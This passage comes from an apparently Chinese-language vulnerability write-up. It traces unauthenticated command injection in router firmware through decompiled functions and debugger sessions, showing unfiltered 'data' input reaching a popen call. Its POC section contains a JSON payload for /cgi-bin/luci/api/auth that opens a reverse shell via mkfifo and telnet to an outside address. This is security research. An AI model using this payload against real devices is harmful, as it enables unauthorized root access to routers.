<span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      &#125;</span><br><span class="line">      sub_40B304((<span class="type">int</span> **)v7);<span class="comment">// devSta.set这个字段的话 前面的if都进不去，会触发这里的sub_40B304函数</span></span><br><span class="line">LABEL_23:</span><br><span class="line">      v4 = (<span class="type">int</span> *)i;</span><br><span class="line">    &#125;</span><br><span class="line">......</span><br><span class="line">  &#125;</span><br><span class="line">  v1 = <span class="number">-1</span>;</span><br><span class="line">......</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><code>sub_40B304</code> 函数最关键的作用就是过渡到 <code>sub_40B0B0</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291500311.png" alt="image-20230829145958320"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_40B304</span><span class="params">(<span class="type">int</span> **a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  v2 = **a1;</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)v2 == <span class="number">5</span> )<span class="comment">//根据上图信息得知v2应该是2，这个if进不去</span></span><br><span class="line">  &#123;</span><br><span class="line">LABEL_2:</span><br><span class="line">    *(_BYTE *)(v2 + <span class="number">48</span>) = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( byte_435EC9 )<span class="comment">//这里是硬编码的1</span></span><br><span class="line">    &#123;</span><br><span class="line">      v3 = a1;</span><br><span class="line">      v4 = (<span class="type">int</span> (__fastcall *)(<span class="type">int</span> **))sub_40B0B0;<span class="comment">//将sub_40B0B0函数指针赋值给v4</span></span><br><span class="line">      <span class="keyword">return</span> v4(v3);<span class="comment">//此处IDA显示有些问题，其实执行的并不是这里的v4(v3)</span></span><br><span class="line">    &#125;</span><br><span class="line">LABEL_28:</span><br><span class="line">    v3 = a1;</span><br><span class="line">    v4 = sub_40B168;</span><br><span class="line">    <span class="keyword">return</span> v4(v3);<span class="comment">//上面的函数指针赋值给v4，最后调用的其实是这里的v4(v3)  调试一下就能看出来</span></span><br><span class="line">  &#125;</span><br><span class="line">  v5 = *(<span class="type">const</span> <span class="type">char</span> **)(v2 + <span class="number">20</span>);<span class="comment">//这里v2+20其实为remoteIp字段，因为在lua处理的时候，加上了remoteIp字段（意思是remoteIp字段有值，值为空。并非是remoteIp字段为空），所以这个v5是一个地址，指向了一个空的字符串而已（如果之前没有地方帮我们添加remoteIp字段的话，还需要自己传入一个remoteIp进来）</span></span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = is_self_ip(v5);<span class="comment">//传入一个指向空字符串的地址，返回值为0</span></span><br><span class="line">    v7 = *a1;</span><br><span class="line">    <span class="keyword">if</span> ( !v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = *v7;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_2;<span class="comment">//执行到此处进行跳转</span></span><br><span class="line">    &#125;</span><br><span class="line">    v7[<span class="number">11</span>] = <span class="number">3</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><code>sub_40B0B0</code> 函数中对关键的信号量进行了操作</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_40B0B0</span><span class="params">(_DWORD *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *v2; <span class="comment">// $v1</span></span><br><span class="line">  _DWORD *v3; <span class="comment">// $v1</span></span><br><span class="line">  ++dword_435ECC;</span><br><span class="line">  pthread_mutex_lock(&amp;unk_435E74);</span><br><span class="line">  v2 = (_DWORD *)dword_435DC4;</span><br><span class="line">  a1[<span class="number">3</span>] = &amp;cmd_task_run_head;</span><br><span class="line">  dword_435DC4 = (<span class="type">int</span>)(a1 + <span class="number">3</span>);</span><br><span class="line">  a1[<span class="number">4</span>] = v2;</span><br><span class="line">  *v2 = a1 + <span class="number">3</span>;</span><br><span class="line">  v3 = (_DWORD *)dword_435DB4;</span><br><span class="line">  a1[<span class="number">2</span>] = dword_435DB4;</span><br><span class="line">  dword_435DB4 = (<span class="type">int</span>)(a1 + <span class="number">1</span>);</span><br><span class="line">  a1[<span class="number">1</span>] = &amp;cmd_task_remote_head;</span><br><span class="line">  *v3 = a1 + <span class="number">1</span>;</span><br><span class="line">  pthread_mutex_unlock(&amp;unk_435E74);</span><br><span class="line">  sem_post(&amp;unk_435E90);<span class="comment">//该函数最关键的部分就是此处sem_post对信号量unk_435E90操作</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>在 <code>uf_task_remote_pop_queue</code> 函数中的 <code>sem_wait(&amp;unk_435E90)</code> 本身是卡住了当前线程，而 <code>sub_40B0B0</code> 这里对信号量操作一触发，<code>deal_remote_config_handle</code> 函数就可以继续运行了，<code>uf_task_remote_pop_queue</code> 函数结束，随后就调用了关键的 <code>uf_cmd_call</code> 函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">deal_remote_config_handle</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  v1 = pthread_self();</span><br><span class="line">  pthread_detach(v1);</span><br><span class="line">  pthread_setcanceltype(<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  prctl(<span class="number">15</span>, <span class="string">&quot;remote_config_handle&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(a1 + <span class="number">16</span>) = <span class="number">0</span>;</span><br><span class="line">      v3 = uf_task_remote_pop_queue();</span><br><span class="line">      *(_DWORD *)(a1 + <span class="number">16</span>) = v3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( !v3 );</span><br><span class="line">......</span><br><span class="line">    v5 = uf_cmd_call(*v4, v4 + <span class="number">1</span>);<span class="comment">//关键函数</span></span><br><span class="line">......</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="从uf-cmd-call函数开始"><a href="#从uf-cmd-call函数开始" class="headerlink" title="从uf_cmd_call函数开始"></a>从uf_cmd_call函数开始</h4><p>在 <code>uf_cmd_call</code> 函数执行的地方打上断点，<code>c</code> 过来之后是如下界面，此时输入命令 <code>set scheduler-locking on</code> 将线程锁定（避免后续调试时，在各个线程中下的断点跳来跳去，之后只调试这一个线程）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291617137.png" alt="image-20230829161715801"></p>
<p>由于 <code>uf_cmd_call</code> 函数的代码量太长了，这里就不再出示相关代码，只调试和描述几个关键点</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291632275.png" alt="image-20230829163240216"></p>
<p>首先做了 <code>if</code> 判断，检查操作类型，因为我们这里是 <code>devSta</code> 为 <code>2</code>，所以这个 <code>if</code> 进不去（调试界面如下图）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291631518.png" alt="image-20230829163146277"></p>
<p>上面的 <code>if</code> 出来后，就会做这里的判断，这里的 <code>v2</code> 是 <code>devSta.set</code> 中的 <code>set</code> 部分，<code>uf_ex_cmd_type</code> 数组里装了各种操作的字符串例如 <code>set</code> <code>get</code> 之类的，数组里第一个元素就是 <code>set</code>，所以这个 <code>while</code> 进不去</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291701815.png" alt="image-20230829170100754"></p>
<p>调试界面如下</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291711972.png" alt="image-20230829171103707"></p>
<p>后面的执行流转折点为 <code>if(!v16)</code> 这里</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291723184.png" alt="image-20230829172302135"></p>
<p>这个 <code>a1+45</code> 的位置当时解析的时候有一个标志位（如下图），但这个 <code>from_url</code> 并没有特别设置，所以这里就为 <code>0</code> ，导致进入了 <code>if(!v16)</code> ，执行跳转语句 <code>goto LABEL_86</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291724142.png" alt="image-20230829172452094"></p>
<p>&#96;</p>
<p><code>if ( !v103[20] )</code> 位置的判断，这里的 <code>v103[20]</code> 其实就是 <code>data</code> 字段的值</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291641637.png" alt="image-20230829164105564"></p>
<p>调试界面如下，因为 <code>！v103[20]</code> 为 <code>FALSE</code> ，所以这个 <code>if</code> 进不去</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291644044.png" alt="image-20230829164439766"></p>
<p>在 <code> if ( !v103[7] )</code> 位置做了判断，调试可知 <code>v103[7]</code> 为 <code>2</code> ，因此 <code>if</code> 这里进不去，随后直接触发 <code>goto LABEL_174</code> 和 <code>goto LABEL_175</code>  </p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308300959950.png" alt="image-20230830095922837"></p>
<p>从 <code>goto LABEL_175</code> 继续往下分析，在 <code>416</code> 的位置 <code>if</code> 进不去，然后通过调试 <code>435</code> 行这里的 <code>if</code> 可以进来</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308301007797.png" alt="image-20230830100751735"></p>
<p>在 <code>438</code> 行做的检查，判断了偏移 <code>48</code> 的位置是否为 <code>1</code> ，回顾字段解析的位置可以发现，我们是可以控制这里的值为 <code>1</code> 的（满足下图的条件即可）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308301020203.png" alt="image-20230830102023155"></p>
<p>但我没控制这个字段，调试过来发现偏移 <code>48</code> 的位置仍然是 <code>1</code> ，可能是之前某处代码设置了这个位置的值（调试界面如下图），总之这个 <code>if</code> 进不去</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308301025970.png" alt="image-20230830102517726"></p>
<p>由于上面的 <code>if</code> 进不去，那么出来之后直接到了 <code>489</code> 行的位置，此时已经能看到接下来必定会触发 <code>ufm_handle</code> 函数（<code>v103</code> 指向了 <code>uf_cmd_call</code> 函数的参数 <code>a1</code> ，也就是上文一直提到的存储解析字段的结构体）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308301028645.png" alt="image-20230830102817582"></p>
<h4 id="命令执行前夕"><a href="#命令执行前夕" class="headerlink" title="命令执行前夕"></a>命令执行前夕</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">ufm_handle</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  v2 = *(<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">8</span>);</span><br><span class="line">  v4 = *(_DWORD *)(a1 + <span class="number">20</span>);</span><br><span class="line">  v5 = *(_DWORD *)(a1 + <span class="number">56</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v2 || !*v2 )<span class="comment">//这里是*(a1+8) 为0，并不是(int)(*a1)+8  开始分析的时候我以为这里检查的是module字段</span></span><br><span class="line">    <span class="keyword">goto</span> LABEL_185;<span class="comment">//这里会跳转</span></span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( remote_call(*(_DWORD **)a1, (<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">88</span>)) == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_185:</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v5, <span class="string">&quot;group_change&quot;</span>) || !<span class="built_in">strcmp</span>(v5, <span class="string">&quot;network&quot;</span>) || !<span class="built_in">strcmp</span>(v5, <span class="string">&quot;network_group&quot;</span>) )<span class="comment">//v5是module的值  为networkId_merge  因此这个if进不去</span></span><br><span class="line">      sub_40E498(v6);</span><br><span class="line">    v8 = <span class="built_in">strcmp</span>(v4, <span class="string">&quot;get&quot;</span>);<span class="comment">//v4是set</span></span><br><span class="line">    <span class="keyword">if</span> ( !v8 )<span class="comment">//这个if进不去</span></span><br><span class="line">    &#123;</span><br><span class="line">......</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v4, <span class="string">&quot;set&quot;</span>) || !<span class="built_in">strcmp</span>(v4, <span class="string">&quot;add&quot;</span>) || !<span class="built_in">strcmp</span>(v4, <span class="string">&quot;del&quot;</span>) || !<span class="built_in">strcmp</span>(v4, <span class="string">&quot;update&quot;</span>) )<span class="comment">//这里比较set是会通过检查</span></span><br><span class="line">    &#123;</span><br><span class="line">      v29 = sub_40FD5C(a1);<span class="comment">//触发关键函数</span></span><br><span class="line">......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p><code>sub_40FD5C</code> 函数关键代码分析如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_40FD5C</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memset</span>(v52, <span class="number">0</span>, <span class="keyword">sizeof</span>(v52));</span><br><span class="line">  v2 = *(_BYTE **)(a1 + <span class="number">80</span>);<span class="comment">// v2是data字段的值</span></span><br><span class="line">  <span class="keyword">if</span> ( !v2 || !*v2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v3 = *(_DWORD *)(a1 + <span class="number">28</span>);<span class="comment">// v3是2（devSta所导致的）</span></span><br><span class="line">  v4 = v3 &lt; <span class="number">2</span>;<span class="comment">//因为v3是2，所以这里的判断是FALSE v4为0</span></span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = json_object_object_get(*(_DWORD *)(a1 + <span class="number">92</span>), <span class="string">&quot;sn&quot;</span>);<span class="comment">// 因为sn字段为空，所以下面的if进入，触发goto LABEL_45</span></span><br><span class="line">    <span class="keyword">if</span> ( !v5 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_45;</span><br><span class="line">......   </span><br><span class="line">LABEL_45:</span><br><span class="line">          v3 = *(_DWORD *)(a1 + <span class="number">28</span>);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">......</span><br><span class="line">LABEL_46:</span><br><span class="line">      v4 = v3 &lt; <span class="number">2</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_47;</span><br><span class="line">......</span><br><span class="line">LABEL_47:</span><br><span class="line">  <span class="keyword">if</span> ( v4 )<span class="comment">//经过三次跳转后，对v4做判断，因为v4为0 会触发下面的else</span></span><br><span class="line">  &#123;</span><br><span class="line">......</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v3 != <span class="number">2</span> )<span class="comment">//v3是2，所以这个if进不去</span></span><br><span class="line">    &#123;</span><br><span class="line">......</span><br><span class="line">    &#125;</span><br><span class="line">    v18 = sub_40CEAC(a1, a1 + <span class="number">88</span>, <span class="number">0</span>, <span class="number">0</span>);<span class="comment">//触发关键函数</span></span><br><span class="line">......</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v18;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>对 <code> sub_40CEAC</code> 函数的分析如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *(_BYTE *)(*a1 + <span class="number">46</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v5 = *(_DWORD *)(*a1 + <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(v5, <span class="string">&quot;commit&quot;</span>) )<span class="comment">//v5是set，这里判断的是不为commit则进入if，所以这两个if都能进入</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(v5, <span class="string">&quot;init&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !a4 &amp;&amp; !a1[<span class="number">7</span>] )<span class="comment">//a4是固定的0，但是a1[7]的值为2，导致了这个if进不去</span></span><br><span class="line">      &#123;</span><br><span class="line">.......</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  gettimeofday(&amp;v90, <span class="number">0</span>);</span><br><span class="line">  v19 = a1[<span class="number">24</span>];</span><br><span class="line">  <span class="keyword">if</span> ( !*(_DWORD *)(v19 + <span class="number">160</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !is_module_support_lua(a1[<span class="number">24</span>], (<span class="type">int</span>)a1) )</span><br><span class="line">    &#123;</span><br><span class="line">      v63 = a1[<span class="number">20</span>];<span class="comment">//v63为data字段的值</span></span><br><span class="line">      <span class="keyword">if</span> ( v63 )</span><br><span class="line">        v64 = <span class="built_in">strlen</span>(v63);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v64 = <span class="number">0</span>;</span><br><span class="line">......</span><br><span class="line">      <span class="keyword">if</span> ( a3 )<span class="comment">//a3是固定的0</span></span><br><span class="line">      &#123;</span><br><span class="line">...... </span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( a4 )<span class="comment">//a4也是固定的0</span></span><br><span class="line">      &#123;</span><br><span class="line">......</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v70 = <span class="built_in">snprintf</span>(v66, v68, <span class="string">&quot;/usr/sbin/module_call %s %s&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)a1[<span class="number">5</span>], (<span class="type">const</span> <span class="type">char</span> *)(v67 + <span class="number">8</span>));<span class="comment">//这里其实也是正常的命令拼接 a1[5]是set，v67+8是 networkId_merge</span></span><br><span class="line">        v71 = (<span class="type">const</span> <span class="type">char</span> *)a1[<span class="number">20</span>];<span class="comment">//v71是data字段的值</span></span><br><span class="line">        v72 = &amp;v66[v70];</span><br><span class="line">        <span class="keyword">if</span> ( v71 )<span class="comment">//如果data字段的值存在的话，执行下面的拼接</span></span><br><span class="line">          v72 += <span class="built_in">snprintf</span>(&amp;v66[v70], v68, <span class="string">&quot; &#x27;%s&#x27;&quot;</span>, v71);<span class="comment">//这里存在了命令注入，data字段的值为我们可控，造成了任意命令拼接到原本的字符串上</span></span><br><span class="line">        v73 = a1[<span class="number">21</span>];</span><br><span class="line">        <span class="keyword">if</span> ( v73 )</span><br><span class="line">          <span class="built_in">snprintf</span>(v72, v68, <span class="string">&quot; %s&quot;</span>, v73);</span><br><span class="line">      &#125;</span><br><span class="line">......</span><br><span class="line">      v74 = *(_DWORD *)(*a1 + <span class="number">4</span>);</span><br><span class="line">      v75 = <span class="built_in">strcmp</span>(v74, <span class="string">&quot;set&quot;</span>);</span><br><span class="line">      v76 = *((<span class="type">unsigned</span> __int8 *)a1 + <span class="number">19</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (!v75 || !<span class="built_in">strcmp</span>(v74, <span class="number">0x41FBF4</span>) || a3) &amp;&amp; *((_BYTE *)a1 + <span class="number">4</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">......</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v18 = ufm_commit_add(<span class="number">0</span>, v66, <span class="number">0</span>, a2);<span class="comment">//此处的v66是上面拼接后的最终命令</span></span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>



<p><code>ufm_commit_add</code> 函数最开始直接调用了 <code>async_cmd_push_queue</code> 函数，下面对该函数进行分析</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">async_cmd_push_queue</span><span class="params">(_DWORD *a1, <span class="type">const</span> <span class="type">char</span> *a2, <span class="type">unsigned</span> __int8 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  v3 = a3;</span><br><span class="line">......</span><br><span class="line">  <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="number">68</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !a1 )<span class="comment">//a1是传入进来的0</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 )<span class="comment">//a2是注入的命令字符串</span></span><br><span class="line">    &#123;</span><br><span class="line">      v19 = strdup(a2);                         <span class="comment">// 会走到这里</span></span><br><span class="line">      *(_DWORD *)(v7 + <span class="number">28</span>) = v19;<span class="comment">//将命令存储到偏移28的位置，这里比较重要 </span></span><br><span class="line">      <span class="keyword">if</span> ( v19 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_34;                          <span class="comment">// 会从这里跳转</span></span><br><span class="line">......        </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">LABEL_34:</span><br><span class="line">  v20 = (_DWORD *)dword_435DE0;</span><br><span class="line">  *(_DWORD *)(v7 + <span class="number">60</span>) = &amp;commit_task_head;</span><br><span class="line">  dword_435DE0 = v7 + <span class="number">60</span>;</span><br><span class="line">  v21 = dword_4360A4;</span><br><span class="line">  *(_DWORD *)(v7 + <span class="number">64</span>) = v20;</span><br><span class="line">  *v20 = v7 + <span class="number">60</span>;</span><br><span class="line">  dword_4360A4 = v21 + <span class="number">1</span>;</span><br><span class="line">  *(_BYTE *)(v7 + <span class="number">32</span>) = v3;</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    sem_init(v7 + <span class="number">36</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  pthread_mutex_unlock(&amp;unk_4360B8);</span><br><span class="line">  sem_post(&amp;unk_4360A8);<span class="comment">//这里将信号量加上了1，意味着其他地方应该是有sem_wait阻塞了一个线程的执行</span></span><br><span class="line">  <span class="keyword">return</span> v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="切换线程-命令执行"><a href="#切换线程-命令执行" class="headerlink" title="切换线程-命令执行"></a>切换线程-命令执行</h4><p>对信号量  <code>unk_4360A8</code> 进行交叉引用，定位到了 <code>sub_41AFC8</code> 函数。只要上面的代码执行<code>sem_post</code> 将该信号量加一，那么这个线程就能继续运行，从而调用 <code>sub_41ADF0</code> 函数（调试这里需要取消线程锁定）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">sub_41AFC8</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">......</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      sem_wait(&amp;unk_4360A8);</span><br><span class="line">......</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( !v4 );</span><br><span class="line">......</span><br><span class="line">    sub_41ADF0(v4);</span><br><span class="line">......</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>下面对 <code>sub_41ADF0</code> 函数做简单的分析</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_41ADF0</span><span class="params">(_DWORD *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  v1 = *a1;</span><br><span class="line">  <span class="keyword">if</span> ( *a1 )<span class="comment">//为0 进不去这个if</span></span><br><span class="line">  &#123;</span><br><span class="line">......   </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !*((_BYTE *)a1 + <span class="number">32</span>) )<span class="comment">//*((_BYTE *)a1 + 32)为0，可以进入if</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = ufm_popen((<span class="type">const</span> <span class="type">char</span> *)a1[<span class="number">7</span>], a1 + <span class="number">13</span>);<span class="comment">//这个a1[7]，也就是偏移28的位置，上文中提到最后拼接的命令就被写入了一个结构体偏移28的位置，因此这里触发命令执行，且没有做任何过滤</span></span><br><span class="line">      v3 = a1;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308301517529.png" alt="image-20230830151703071"></p>
<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>向 <code>/cgi-bin/luci/api/auth</code> 路径发送 <code>POST</code> 报文，即可在未授权的情况下拿到路由器的最高权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;method&quot;: &quot;merge&quot;,</span><br><span class="line">	&quot;params&quot;: &#123;</span><br><span class="line">		&quot;sorry&quot;: &quot;&#x27;$(mkfifo /tmp/test;telnet 192.168.45.66 6666 0&lt;/tmp/test|/bin/sh &gt; /tmp/test)&#x27;&quot;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="攻击演示"><a href="#攻击演示" class="headerlink" title="攻击演示"></a>攻击演示</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308311455808.png" alt="image-20230831145405109"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308311456572.png" alt="image-20230831145508255"></p>
<p>上面对 <code>lua</code> 文件以及二进制文件的调用链进行了分析和调试，下面记录下在分析过程中自己产生的疑问以及自己探究出的答案</p>
<h2 id="疑问-amp-amp-解决"><a href="#疑问-amp-amp-解决" class="headerlink" title="疑问&amp;&amp;解决"></a>疑问&amp;&amp;解决</h2><h3 id="deal-remote-config-handle函数是怎么被触发的"><a href="#deal-remote-config-handle函数是怎么被触发的" class="headerlink" title="deal_remote_config_handle函数是怎么被触发的"></a>deal_remote_config_handle函数是怎么被触发的</h3><p>在 <code>uf_cmd_task_init</code> 函数中，调用了 <code>create_thread</code> 函数，该函数调用了 <code>pthread_create</code> 函数来创建一个新的线程</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">create_thread</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// $v0</span></span><br><span class="line"></span><br><span class="line">  result = pthread_create();</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_BYTE *)(a1 + <span class="number">13</span>) = <span class="number">0</span>;</span><br><span class="line">    result = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *(_BYTE *)(a1 + <span class="number">13</span>) = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接看 <code>IDA</code> 发现 <code>create_thread</code> 函数中并没有参数，但是该函数的定义如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pthread_create</span><span class="params">(<span class="type">pthread_t</span> *thread, <span class="type">const</span> <span class="type">pthread_attr_t</span> *attr,</span></span><br><span class="line"><span class="params">                   <span class="type">void</span> *(*start_routine)(<span class="type">void</span> *), <span class="type">void</span> *arg)</span>;</span><br></pre></td></tr></table></figure>

<p>其中标明了第三个参数（寄存器应该为 <code>$a2</code>）是新线程的执行入口函数，判断出这里是 <code>IDA</code> 的显示问题，分析汇编代码查看 <code>pthread_create</code> 函数的第三个参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LOAD:0040BE64                 li      $gp, (dword_4358A0+0x7FF0 - .)</span><br><span class="line">LOAD:0040BE6C                 addu    $gp, $t9</span><br><span class="line">LOAD:0040BE70                 addiu   $sp, -0x20</span><br><span class="line">LOAD:0040BE74                 la      $t9, pthread_create</span><br><span class="line">LOAD:0040BE78                 lw      $a2, 4($a0)</span><br><span class="line">LOAD:0040BE7C                 move    $a1, $zero</span><br><span class="line">LOAD:0040BE80                 sw      $s0, 0x18+var_s0($sp)</span><br><span class="line">LOAD:0040BE84                 sw      $gp, 0x18+var_8($sp)</span><br><span class="line">LOAD:0040BE88                 sw      $ra, 0x18+var_s4($sp)</span><br><span class="line">LOAD:0040BE8C                 move    $a3, $a0</span><br><span class="line">LOAD:0040BE90                 jalr    $t9 ; pthread_create</span><br><span class="line">LOAD:0040BE94                 move    $s0, $a0</span><br></pre></td></tr></table></figure>

<p>发现有指令 <code>lw    $a2, 4($a0)</code> <code>$a0</code> 为 <code>create_thread</code> 函数的实参，这里是将 <code>$a0</code> 加 <code>4</code> 的位置赋值给了 <code>$a2</code> ，交叉引用发现 <code>deal_remote_config_handle</code> 函数地址最终就是 <code>pthread_create</code> 函数的第三个参数</p>
